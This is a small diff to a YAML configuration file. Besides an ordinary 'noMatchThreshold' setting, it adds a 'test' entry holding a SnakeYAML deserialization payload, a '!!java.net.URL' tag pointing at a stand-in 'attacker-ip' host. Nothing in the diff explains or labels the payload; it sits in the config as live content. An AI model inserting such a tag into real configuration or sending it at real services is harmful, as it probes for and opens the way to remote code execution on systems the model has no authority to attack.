@@ -11,3 +11,5 @@ sts:
 
 caila:
     noMatchThreshold: 0.2
+    
+test: !!java.net.URL ["http://attacker-ip/"]
